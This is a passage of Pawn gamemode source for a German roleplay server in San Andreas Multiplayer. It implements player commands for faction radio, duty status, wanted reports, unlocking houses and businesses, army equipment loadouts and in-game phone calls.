                if(PlayerInfo[playerid][sMember] == 15) format(string, sizeof(string), "[%s %s >> %s <<]",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
				ProxDetector(100.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
				printf("%s", string);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "   Du musst bei der Polizei/Bundeswehr sein, um diesen Befehl benutzen zu können !");
				return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/music", true) == 0 || strcmp(cmd, "/radio", true) == 0)//http://rb-bremennext-live.cast.addradio.de/rb/bremennext/live/mp3/128/stream.mp3
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if(IsADtCar(vehicleid))// Privatfahrzeug
			{
				new carowner = GetDtCarOwner(vehicleid);
		        new slot = GetDtCarOwnerSlot(carowner,vehicleid);
				if (carowner == playerid)// playerid
				{

					if (PlayerCar[carowner][slot][SoundSystem] == 1)// playerid
					{


		 				ShowPlayerDialog(playerid, DIALOG_RADIO, DIALOG_STYLE_LIST, "GTA-City Reallife Radio","Technobase.FM\ni-Love Radio\ni-Love Radio Dance\nBremen 4 Next\nCommunity Radio (Classic)\nCommunity Radio (Classic Charts)\nCommunity Radio (Charts)\nRadio Ausschalten","Auswählen","Abbrechen");
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Du hast keine Stereoanlage! Kaufe dir eine im Wheel Arche Angels oder Transfender.");
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Du hast das Auto geklaut, also musst du diese abgefuckte scheiss musik auch hören!");
				}
			}
		}
        return 1;
	}
//----------------------------------[Team]-----------------------------------------------
    if(strcmp(cmd, "/r", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[90];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: (/r)adio [radio chat]");
                return 1;
            }
            if(PlayerInfo[playerid][sMember] == 1 || PlayerInfo[playerid][sMember] == 2 || PlayerInfo[playerid][sMember] == 3 || PlayerInfo[playerid][sMember] == 4 || PlayerInfo[playerid][sMember] == 7 || PlayerInfo[playerid][sMember] == 24 || PlayerInfo[playerid][sMember] == 22|| PlayerInfo[playerid][sMember] == 15)
            {
          		format(string, sizeof(string), "** %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
				SendRadioMessage(PlayerInfo[playerid][sMember],COLOR_LIGHTBLUE, string);
                printf("%s", string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   Du bist kein Teammitglied !");
                return 1;
            }
        }
        return 1;
    }
	//============================= Undercover Lights ======================//
	if(!strcmp("/ucl",cmdtext,true))
	{
		if(IsACop(playerid))
	    {
	       	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
	     	{
	     	if(UCL[playerid] == 0)
	    	{
					SetPVarInt(playerid, "Status", 1);
	        		SetPVarInt(playerid, "undercover", CreateDynamicObject(18646,0,0,0,0,0,0));
	        		AttachDynamicObjectToVehicle(GetPVarInt(playerid, "undercover"), GetPlayerVehicleID(playerid), -0.5, -0.2, 0.8, 2.0, 2.0, 3.0);
					SendClientMessage(playerid, 0xFFFFFFAA, "Undercover Lichter Installiert. Lösch sie wieder mit /ucldel");
					UCL[playerid] = 1;
				}
			}
			else
			{
		    	SendClientMessage(playerid,COLOR_GRAD1,"* Du musst in einem Undercovercar(Sultan) sitzen!");
			}
		}
		else
		{
		    SendClientMessage(playerid,COLOR_GRAD1,"* Du bist kein Polizist!");
		}
		return 1;
	}

	if(!strcmp("/ucldel",cmdtext,true))
	{
 			if(IsACop(playerid))
	    	{
	        	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
	        	{
	        		if(UCL[playerid] == 1)
 					{
 					DeletePVar(playerid, "Status");
            		DestroyDynamicObject(GetPVarInt(playerid, "undercover"));
            		SendClientMessage(playerid,COLOR_GRAD1,"* Undercover Lichter entfernt.");
            		UCL[playerid] = 0;
				}
  		 	}
			else
			{
		    	SendClientMessage(playerid,COLOR_GRAD1,"* Du musst in einem Undercovercar(Sultan) sitzen!");
			}
		}
		else
		{
		    SendClientMessage(playerid,COLOR_GRAD1,"* Du bist kein Polizist!");
		}
		return 1;
	}

//----------------------------------[offduty]-----------------------------------------------
	if(strcmp(cmd, "/duty", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			GetPlayerName(playerid, sendername, sizeof(sendername));
			if(PlayerInfo[playerid][sMember] == 1 ||PlayerInfo[playerid][sMember] == 2 ||PlayerInfo[playerid][sMember] == 3)
			{
				if (IsPlayerInRangeOfPoint(playerid,23.0,255.4146,75.4813,1003.6406)||IsPlayerInRangeOfPoint(playerid,3.0,201.8244,1865.1124,13.1406) ||IsPlayerInRangeOfPoint(playerid,23.0,220.8903,111.8219,1003.2188)||IsPlayerInRangeOfPoint(playerid,23.0,217.4071,184.3011,1003.0313) || IsPlayerInRangeOfPoint(playerid,23.0,217.4286,184.4526,1003.0313) || IsPlayerInRangeOfPoint(playerid,3.0,1496.1060,1309.2910,1093.2869))
				{
					if(OnDuty[playerid]==0)
			        {
						if(PlayerInfo[playerid][sMember] == 1)
						{
         	 	  		    SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du bist nun im Dienst!");
							OnDuty[playerid] = 1;
		 				 	SetPlayerColor(playerid,NAMECOLOR_LSCOP);
						}
						else if(PlayerInfo[playerid][sMember] == 2)
						{
         	 	  		    SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du bist nun im Dienst!");
							OnDuty[playerid] = 1;
		 				 	SetPlayerColor(playerid,NAMECOLOR_FBI);
						}
						else if(PlayerInfo[playerid][sMember] == 3)
						{
         	 	  		    SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du bist nun im Dienst!");
							OnDuty[playerid] = 1;
		 				 	SetPlayerColor(playerid,NAMECOLOR_Bundeswehr);
						}
					}
					else if(OnDuty[playerid]==1)
					{
            		    SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du bist nun nicht mehr im Dienst!");
      					ResetPlayerWeapons(giveplayerid);
						OnDuty[playerid] = 0;
		 			 	SetPlayerColor(playerid,TEAM_HIT_COLOR);
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "   Du bist in keiner Umkleide !");
					return 1;
				}
			}
			else if(PlayerInfo[playerid][pMember] == 4||PlayerInfo[playerid][pLeader] == 4||PlayerInfo[playerid][sMember] == 15)
			{
			    new vid = GetPlayerVehicleID(playerid);
				new md = GetVehicleModel(vid);
			    if(IsPlayerInRangeOfPoint(playerid,3.0,1735.5508,-1114.3833,24.0859) || md == 416 || md == 596 || md == 597 || md == 598 || md == 599 || md == 490)
	 		    {

				    if(JobDuty[playerid] == 1)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du bist nun ausser Dienst und empfängst keine Notrufe mehr.");
				        JobDuty[playerid] = 0;
				        Medics -= 1;
			 			SetPlayerColor(playerid,TEAM_HIT_COLOR);
				    }
				    else
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du bist nun im Dienst und wirst Notrufe empfangen.");
				        JobDuty[playerid] = 1;
				        Medics += 1;
			 			SetPlayerColor(playerid,NAMECOLOR_MEDIC);
				    }
				}
				else
				{
				        SendClientMessage(playerid, COLOR_GREY, "Du bist nicht am Duty point / In einem Medic Car!");
						return 1;
				}
			}
			else if(PlayerInfo[playerid][pLeader] == 24 || PlayerInfo[playerid][pMember] == 24)
			{
			    if(JobDuty[playerid] == 1)
			    {
			        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du bist nun ausser Dienst als Automechaniker und empfängst keine Anrufe mehr.");
			        JobDuty[playerid] = 0;
			        Mechanics -= 1;
		 			SetPlayerColor(playerid,TEAM_HIT_COLOR);//0x33CCFFAA
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du bist nun im Dienst als Automechaniker und wirst Notrufe empfangen..");
			        JobDuty[playerid] = 1;
			        Mechanics += 1;
		 			SetPlayerColor(playerid,0x33CCFFAA);//0x33CCFFAA
			    }
			}
			else if(PlayerInfo[playerid][pLeader] == 22 || PlayerInfo[playerid][pMember] == 22)
			{
			    if(IsPlayerInRangeOfPoint(playerid,3.0,217.4629,184.4351,1003.0313))
				{
			    	if(FWDuty[playerid] == 0)
					{
				    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast dich für den Dienst ausgerüstet!");
				    	FWDuty[playerid] = 1;
//				    	ServerWeapon(playerid,42,10000);
		 				 	SetPlayerColor(playerid,NAMECOLOR_FBI);
					}
					else
					{
				    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du bist wieder außer Dienst.");
				    	FWDuty[playerid] = 0;
		 			 	SetPlayerColor(playerid,TEAM_HIT_COLOR);
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "   Du kannst nicht in den Dienst gehen!");
			}
		}
		return 1;
	}
    //----------------------------------[departments]-----------------------------------------------
    if(strcmp(cmd, "/department", true) == 0 || strcmp(cmd, "/d", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[90];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: (/d)epartment [text]");
                return 1;
            }
            if(PlayerInfo[playerid][sMember] == 1 || PlayerInfo[playerid][sMember] == 2 || PlayerInfo[playerid][sMember] == 3 || PlayerInfo[playerid][sMember] == 4 || PlayerInfo[playerid][sMember] == 7 || PlayerInfo[playerid][sMember] == 24 || PlayerInfo[playerid][sMember] == 22|| PlayerInfo[playerid][sMember] == 15)
            {
                if(PlayerInfo[playerid][sMember] == 1) format(string, sizeof(string), "* %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 2) format(string, sizeof(string), "* %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 3) format(string, sizeof(string), "* %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 4) format(string, sizeof(string), "* %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 7) format(string, sizeof(string), "* %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 22) format(string, sizeof(string), "* %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 24) format(string, sizeof(string), "* %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
                if(PlayerInfo[playerid][sMember] == 15) format(string, sizeof(string), "* %s %s: %s, over. **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
				for(new i=0; i<GetMaxPlayers(); i++)
				{
				    if(IsPlayerConnected(i) && IsADChatter(i))
				    {
				        SendClientMessage(i,COLOR_ALLDEPT,string);
				    }
				}
                printf("%s", string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "   Du bist kein Teil des Teams !");
                return 1;
            }
        }
        return 1;
    }
	if(strcmp(cmd, "/su", true) == 0)// Neues /SU
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /su [playerid] [grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if (gTeam[playerid] == 2 || IsACop(playerid))
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /su [playerid] [Grund]");
							return 1;
						}
							WantedLevel[giveplayerid] += 1;
							format(string, sizeof(string), "Du hast ein Verbrechen begangen ( %s ). Zeuge: %s.",result,sendername);
							SendClientMessage(giveplayerid, COLOR_RED, string);
							format(string, sizeof(string), "Vergebene Wanteds: 1. Neues Wantedlevel: %d", WantedLevel[giveplayerid]);
							SendClientMessage(giveplayerid, COLOR_YELLOW, string);
							for(new i = 0; i < MAX_PLAYERS; i++)
							{
							    if(IsACop(i))
							    {
									format(string, sizeof(string), "[WANTED] Verdächtiger: %s, Zeuge: %s, Verbrechen: %s",giveplayer,sendername,result);
									SendClientMessage(i, TEAM_BLUE_COLOR, string);
								}
							}
						return 1;
					}
				}//not connected
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/open", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        for(new i = 0; i < sizeof(HouseInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]) || IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
				{
					if(PlayerInfo[playerid][pHouseKey] == i || PlayerInfo[playerid][pAdmin] >= 3)
					{
						if(HouseInfo[i][hLock] == 1)
						{
							HouseInfo[i][hLock] = 0;
							GameTextForPlayer(playerid, "~w~Tuer ~g~Auf", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							return 1;
						}
						if(HouseInfo[i][hLock] == 0)
						{
							HouseInfo[i][hLock] = 1;
							GameTextForPlayer(playerid, "~w~Tuer ~g~Zu", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							return 1;
						}
					}
					else
					{
						GameTextForPlayer(playerid, "~r~Du besitzt keinen Schluessel", 5000, 6);
						return 1;
					}
				}
			}
			for(new i = 0; i < sizeof(BizzInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]) || IsPlayerInRangeOfPoint(playerid,3.0,BizzInfo[i][bExitX], BizzInfo[i][bExitY], BizzInfo[i][bExitZ]))
				{
					if(PlayerInfo[playerid][pPbiskey] == i|| PlayerInfo[playerid][pAdmin] >= 3)
					{
						if(BizzInfo[i][bLocked] == 1)
						{
							BizzInfo[i][bLocked] = 0;
							GameTextForPlayer(playerid, "~w~Bussiness ~g~geoeffnet", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							return 1;
						}
						if(BizzInfo[i][bLocked] == 0)
						{
							BizzInfo[i][bLocked] = 1;
							GameTextForPlayer(playerid, "~w~Bussiness ~r~geschlossen", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							return 1;
						}
					}
					else
					{
						GameTextForPlayer(playerid, "~r~Du besitzt keinen Schluessel", 5000, 6);
						return 1;
					}
				}
			}
			for(new i = 0; i < sizeof(SBizzInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,SBizzInfo[i][sbEntranceX], SBizzInfo[i][sbEntranceY], SBizzInfo[i][sbEntranceZ]))
				{
					if(PlayerInfo[playerid][pPbiskey] == i+100|| PlayerInfo[playerid][pAdmin] >= 3)
					{
						if(SBizzInfo[i][sbLocked] == 1)
						{
							SBizzInfo[i][sbLocked] = 0;
							GameTextForPlayer(playerid, "~w~Bussiness ~g~geoeffnet", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							return 1;
						}
						if(SBizzInfo[i][sbLocked] == 0)
						{
							SBizzInfo[i][sbLocked] = 1;
							GameTextForPlayer(playerid, "~w~Bussiness ~r~geschlossen", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							return 1;
						}
					}
					else
					{
						GameTextForPlayer(playerid, "~r~Du besitzt keinen Schluessel", 5000, 6);
						return 1;
					}
				}
			}
			for(new i = 0; i < sizeof(TankeInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,TankeInfo[i][tEntranceX], TankeInfo[i][tEntranceY], TankeInfo[i][tEntranceZ]))
				{
					if(PlayerInfo[playerid][pPtankekey] == i|| PlayerInfo[playerid][pAdmin] >= 3)
					{
						if(TankeInfo[i][tLocked] == 1)
						{
							TankeInfo[i][tLocked] = 0;
							GameTextForPlayer(playerid, "~w~Tankstelle ~g~Offen", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							return 1;
						}
						if(TankeInfo[i][tLocked] == 0)
						{
							TankeInfo[i][tLocked] = 1;
							GameTextForPlayer(playerid, "~w~Tankstelle ~r~Geschlossen", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							return 1;
						}
					}
					else
					{
						GameTextForPlayer(playerid, "~r~Du besitzt keinen Schluessel", 5000, 6);
						return 1;
					}
				}
			}
	    }
	    return 1;
	}
	if(strcmp(cmd, "/aebank", true) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 5.0,246.4201,118.1929,1003.2188) || IsPlayerInRangeOfPoint(playerid, 5.0, 250.3927,118.3187,1003.2188) || IsPlayerInRangeOfPoint(playerid, 5.0, 242.1908,118.3741,1003.2188))
	    {
			ShowPlayerDialog(playerid, BANK, DIALOG_STYLE_LIST,"Menü", "Kontostand\nEinzahlen\nAuszahlen\nÜberweisen", "Auswählen", "Beenden");
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht an der Bank!");
		}
		return 1;
	}
	if(strcmp(cmd, "/bwequip", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsPlayerInRangeOfPoint(playerid,3.0,201.8244,1865.1124,13.1406))
            {
                tmp = strtoknew(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_WHITE, "Hilfe : /bwequip [item nummer]");
                    SendClientMessage(playerid, COLOR_GREEN, "|_______  Ausrüstung _______|");
                    SendClientMessage(playerid, COLOR_LIGHTGREEN, "| 1: Alle Waffen weglegen    2: Messer");
                    SendClientMessage(playerid, COLOR_LIGHTGREEN, "| 3: Deagle					4: MP5");
                    SendClientMessage(playerid, COLOR_LIGHTGREEN, "| 5: M4					    6: Combat-Schrotflinte");
                    SendClientMessage(playerid, COLOR_LIGHTGREEN, "| 7: Scharfschützengewehr    8: Falschirm");
                    SendClientMessage(playerid, COLOR_LIGHTGREEN, "| 9: Ausrüstung d. Luftwaffe    10: Boden Trupp ausrüstung");
                    SendClientMessage(playerid, COLOR_LIGHTGREEN, "| 11: Wehrdienst Ausrüstung 12: Standart Ausrüstung");
                    return 1;
                }
                new item = strval(tmp);
                if (item == 1)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        ResetPlayerWeapons(playerid);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 2)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        ServerWeapon(playerid, 4, 1);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 3)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)                    {
                        ServerWeapon(playerid, 24, 150);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 4)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        ServerWeapon(playerid, 29, 8000);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 5)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        ServerWeapon(playerid, 31, 800);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 6)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        ServerWeapon(playerid, 27, 700);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 7)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        ServerWeapon(playerid, 34, 50);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 8)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        ServerWeapon(playerid, 46, 1);
					}
                }
                else if (item == 9)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        ServerWeapon(playerid, 46, 1); //Fallschirm
                        ServerWeapon(playerid, 31, 1500);//M4
                        ServerWeapon(playerid, 24, 1500);//Deagle
                        ServerWeapon(playerid, 29, 1500);//Mp5
						SetPlayerArmour(playerid, 100);
                        SetPlayerHealth(playerid, 100);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 10)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
	                    if(PlayerInfo[playerid][pRank] < 3)
	                    {
		                    SendClientMessage(playerid, COLOR_WHITE, "   Nicht Befugt!");
		                    return 1;
		                }
		                else
    		            {
	                        ResetPlayerWeapons(playerid);
	                        ServerWeapon(playerid, 4, 1);//Messer
	                        ServerWeapon(playerid, 16, 5);//Granaten
	                        ServerWeapon(playerid, 17, 50);//tränengas
	                        ServerWeapon(playerid, 31, 1500);//M4
	                        ServerWeapon(playerid, 24, 1500);//Deagle
	                        ServerWeapon(playerid, 29, 1500);//Mp5
	                        SetPlayerArmour(playerid, 100);
	                        SetPlayerHealth(playerid, 100);
						}
                    }
                    else if(PlayerInfo[playerid][pMember] == 1||PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                    }
                }
                else if (item == 11)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        SetPlayerArmour(playerid, 100);
                        SetPlayerHealth(playerid, 100);
                        ServerWeapon(playerid, 24, 100);//Deagle
                        ServerWeapon(playerid, 41, 1500);//Spray
					}
	            }
                else if (item == 12)
                {
                    if(PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7)
                    {
                        SetPlayerArmour(playerid, 100);
                        SetPlayerHealth(playerid, 100);
                        ServerWeapon(playerid, 24, 100);//Deagle
                        ServerWeapon(playerid, 41, 1500);//Spray
                        ServerWeapon(playerid, 31, 2500);//M4
                        ServerWeapon(playerid, 29, 2500);//Mp5

					}
                }
            }
            return 1;
        }
    }
	if(strcmp(cmd, "/random", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new dice = random(6)+1;
			if (gDice[playerid] == 1)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "* %s wirft einen Würfel der auf %d landet.", sendername,dice);
				ProxDetector(5.0, playerid, string, TEAM_GREEN_COLOR,TEAM_GREEN_COLOR,TEAM_GREEN_COLOR,TEAM_GREEN_COLOR,TEAM_GREEN_COLOR);
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/call", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /call [/telefonnummer]");
				return 1;
			}
			if(PlayerInfo[playerid][pTot] == 1)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Du wirst behandelt und kannst nicht telefonieren!");
		        return 1;
		    }
			if(PlayerTied[playerid] == 1)
			{
			    SendClientMessage(playerid, COLOR_LIGHTRED, "Du kannst keinen anrufen, während du gefesselt bist!");
			    return 1;
			}
			if(PlayerInfo[playerid][pPnumber] == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "  Du hast kein Telefon !");
				return 1;
			}
			if(PlayerInfo[playerid][pHandyGeld] <= 4 && PlayerInfo[playerid][pHandyVer] == 0)
	    	{
	        	ShowPlayerDialog(playerid, KEINGUTHABEN, DIALOG_STYLE_MSGBOX, "Handy Guthaben", "Hallo Lieber User,\nMomentan hast du kein Geld auf deinem Handy\nDas kann daran liegen das du es aufgebraucht hast oder\nDas du noch kein Geld drauf hattest!\nGehe zum ATM und lade dein Handy auf!", "Okay", "Abbrechen");
				return 1;
	    	}
			new phonenumb = strval(tmp);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			if(phonenumb == 911)
			{
				SendClientMessage(playerid, COLOR_WHITE, "HILFE: Du kannst jetzt mit \"T\" über das Telefon reden. Gib /hangup ein um aufzulegen.");
				SendClientMessage(playerid, COLOR_ALLDEPT, "Zentrale: Guten Tag, wenn sie mit der Polizei sprechen wollen, schreiben sie Polizei.");
				Mobile[playerid] = 911;
				return 1;
			}
			if(phonenumb == PlayerInfo[playerid][pPnumber])
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Du kannst nicht dich selber anrufen!");
				return 1;
			}
			if(Mobile[playerid] != 255)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "  Du bist schon am Telefonieren...");
				return 1;
			}
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerInfo[i][pPnumber] == phonenumb && phonenumb != 0)
					{
					    if(Mobile[giveplayerid] == 255)
                        {
							giveplayerid = i;
							Mobile[playerid] = giveplayerid; //caller connecting
							if(IsPlayerConnected(giveplayerid))
							{
							    if(giveplayerid != INVALID_PLAYER_ID)
							    {
							        if(PhoneOnline[giveplayerid] > 0)
							        {
							            SendClientMessage(playerid, COLOR_GREY, "Das Handy von diesem Spieler ist ausgeschalten!");
							            return 1;
							        }
									format(string, sizeof(string), "Dein Handy klingelt. (/Pickup) Anrufer: %s", sendername);
									SendClientMessage(giveplayerid, COLOR_YELLOW, string);
									GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
									RingTone[giveplayerid] = 10;
			                        format(string, sizeof(string), "* %s nimmt sein Handy raus.", sendername);
			                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
									SendClientMessage(playerid, COLOR_WHITE, "HILFE: Du kannst jetzt mit \"T\" über das Telefon reden. Gib /hangup ein um aufzulegen.");
									CellTime[playerid] = 1;
									if(PlayerInfo[playerid][pHandyVer] == 0) PlayerInfo[playerid][pHandyGeld] -= 4;
									return 1;
								}
							}
						}
						else
						{
						    SendClientMessage(playerid,COLOR_GREY," Die Leitung ist besetzt...");
						    format(string,sizeof(string)," Anruf von %s geblockt. Du bist noch in einem Gespräch!",sendername);
						    SendClientMessage(giveplayerid,COLOR_PURPLE,string);
						    return 1;
						}
					}
				}
			}
			SendClientMessage(playerid, COLOR_GRAD2, "  *TUT TUT TUT*  Kein Anschluss unter dieser Nummer. *TUT TUT TUT*");
		}
		return 1;
	}
	if(strcmp(cmd, "/sms", true) == 0 || strcmp(cmd, "/t", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		    if(PlayerInfo[playerid][pTot] == 1)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Tote können nicht Reden!");
		        return 1;
		    }
